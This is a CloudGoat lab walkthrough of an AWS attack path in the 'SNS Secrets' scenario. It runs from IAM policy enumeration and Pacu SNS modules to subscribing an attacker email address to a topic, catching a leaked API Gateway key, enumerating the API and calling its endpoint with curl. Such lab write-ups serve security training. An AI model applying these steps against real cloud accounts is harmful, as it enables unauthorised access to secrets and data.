# CloudGoat – SNS Secrets Walkthrough

This document describes the exploitation process for the **SNS Secrets** scenario from CloudGoat.

The objective of this lab is to demonstrate how misconfigured **SNS permissions and API Gateway access** can lead to disclosure of sensitive information such as API keys.


---

# Attack Path

1. Scenario creation
2. Initial IAM credentials obtained
3. IAM permission enumeration
4. SNS topic discovery
5. Subscribe to SNS topic
6. API key leaked through notification
7. API Gateway enumeration
8. Construct API endpoint
9. Access protected resource

---

# Creating the Scenario

The lab environment is created using CloudGoat.

```bash
cloudgoat create sns_secrets
```

After creating the scenario, the following credentials were provided:

```
sns_user_access_key_id = AKIAxxxxxxxxxxxx
sns_user_secret_access_key = xxxxXXXXXXXXXXXXXXXXXXXXXXXX
```

---

# Initial Access

## Configure AWS CLI Profile

Create a profile using the provided credentials.

```bash
aws configure --profile sns-secrets
```

Verify the identity:

```bash
aws sts get-caller-identity --profile sns-secrets
```

Example output:

```json
{
  "UserId": "AIDAxxxxxxxxxxxx",
  "Account": "xxxxxxxxxxxx",
  "Arn": "arn:aws:iam::xxxxxxxxxxxx:user/cg-sns-user-xxxx"
}
```

---

# Discovering Permissions

Now that we have access to an IAM user in the AWS environment, we need to determine what permissions are available.

First, list the policies attached to the user.

```bash
aws iam list-user-policies \
--user-name cg-sns-user-xxxx \
--profile sns-secrets
```

Example output:

```json
{
  "PolicyNames": [
    "cg-sns-user-policy-xxxx"
  ]
}
```

Next, retrieve the policy document.

```bash
aws iam get-user-policy \
--user-name cg-sns-user-xxxx \
--policy-name cg-sns-user-policy-xxxx \
--profile sns-secrets
```

Example output:

```json
{
 "Version":"2012-10-17",
 "Statement":[
  {
   "Effect":"Allow",
   "Action":[
    "sns:Subscribe",
    "sns:Receive",
    "sns:ListSubscriptionsByTopic",
    "sns:ListTopics",
    "sns:GetTopicAttributes",
    "iam:ListGroupsForUser",
    "iam:ListUserPolicies",
    "iam:GetUserPolicy",
    "iam:ListAttachedUserPolicies",
    "apigateway:GET"
   ],
   "Resource":"*"
  }
 ]
}
```

### Key Finding

The IAM user has permissions to:

- Enumerate SNS topics
- Subscribe to SNS topics
- Perform API Gateway GET requests

---

# Enumerating SNS Using Pacu

Start Pacu and import the AWS credentials.

```bash
import_keys sns-secrets
```

Search for SNS modules.

```bash
search sns
```

Example output:

```
sns__subscribe
sns__enum
```

Run the SNS enumeration module.

```bash
run sns__enum --region us-east-1
```

Example output:

```
Running module sns__enum...
[sns__enum] Starting region us-east-1...
[sns__enum] Found 1 topics
```

Retrieve detailed information stored by Pacu.

```bash
data sns
```

Example output:

```json
{
 "sns":{
  "us-east-1":{
   "arn:aws:sns:us-east-1:xxxxxxxxxxxx:public-topic-xxxx":{
    "DisplayName":"",
    "Owner":"xxxxxxxxxxxx",
    "Subscribers":[]
   }
  }
 }
}
```

---

# Subscribing to the SNS Topic

The module `sns__subscribe` allows us to subscribe to an SNS topic using an email address.

View the module help:

```bash
help sns__subscribe
```

Run the module:

```bash
run sns__subscribe \
--topics arn:aws:sns:us-east-1:xxxxxxxxxxxx:public-topic-xxxx \
--email attacker@example.com
```

Example output:

```
Subscribed successfully, check email for confirmation.
```

After confirming the subscription via email, a notification is received containing an **API key**.

Example message:

```
DEBUG: API GATEWAY KEY xxxxXXXXXXXXXXXXXXXX
```

---

# Enumerating API Gateway

Now that we have an API key, we can begin enumerating the API Gateway.

List the available APIs.

```bash
aws apigateway get-rest-apis \
--profile sns-secrets \
--region us-east-1
```

Example output:

```json
{
 "items":[
  {
   "id":"xxxxxx",
   "name":"cg-api-xxxx",
   "description":"API for demonstrating leaked API key scenario",
   "rootResourceId":"xxxxxx"
  }
 ]
}
```

---

# Retrieving API Stages

Identify the deployment stage.

```bash
aws apigateway get-stages \
--rest-api-id xxxxxx \
--profile sns-secrets \
--region us-east-1
```

Example output:

```json
{
 "item":[
  {
   "stageName":"prod-xxxx"
  }
 ]
}
```

---

# Enumerating API Resources

Next, enumerate available API resources.

```bash
aws apigateway get-resources \
--rest-api-id xxxxxx \
--profile sns-secrets \
--region us-east-1
```

Example output:

```json
{
 "items":[
  {
   "path":"/user-data"
  }
 ]
}
```

---

# Constructing the API Endpoint

The full API URL follows this structure:

```
https://[API-ID].execute-api.us-east-1.amazonaws.com/[stage]/[resource]
```

Example:

```
https://xxxxxx.execute-api.us-east-1.amazonaws.com/prod-xxxx/user-data
```

---

# Accessing the Protected Endpoint

Using the leaked API key, the endpoint can be accessed.

```bash
curl https://xxxxxx.execute-api.us-east-1.amazonaws.com/prod-xxxx/user-data \
-H "x-api-key: xxxxXXXXXXXXXXXXXXXX"
```

---

# Conclusion

This lab demonstrates how misconfigured SNS permissions can allow attackers to subscribe to topics and receive sensitive information.

By abusing SNS subscriptions, it was possible to:

1. Discover an SNS topic
2. Subscribe using an attacker-controlled email
3. Receive a leaked API Gateway key
4. Enumerate API Gateway resources
5. Access protected API endpoints

This scenario highlights the importance of properly restricting SNS access and preventing sensitive information from being distributed through automated notifications.
